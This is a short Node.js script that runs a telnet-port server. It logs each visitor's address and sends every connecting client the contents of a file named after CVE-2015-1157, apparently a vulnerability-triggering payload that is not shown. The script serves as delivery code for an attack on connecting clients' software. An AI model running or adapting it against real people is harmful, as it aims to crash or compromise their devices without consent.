var net = require('net');
var fs = require('fs');

var txtdata = fs.readFileSync("CVE-2015-1157.txt");
var log = fs.openSync("access.log", "a");

var server = net.createServer(function(socket) {
    socket.on("error", function (err) {
        //Do nothing
    });
    try {
        try {
            if(process.getuid() == 0)
    	{
                console.log("setuid");
                process.setuid('nobody');
    	}
        } catch (err) {
            console.log("failed to setuid()");
        }
    
        var msg = "Connection from " + socket.remoteAddress;
        console.log(msg);
        fs.writeSync(log, msg + "\n");
	socket.write("All glory to https://twitter.com/hackerfantastic/status/603569247378341888\n");
        socket.write(txtdata);
        socket.end();
    } catch (err) {
        console.log("Error detected.");
    }
});

server.listen(23, '0.0.0.0');
console.log("server created.");
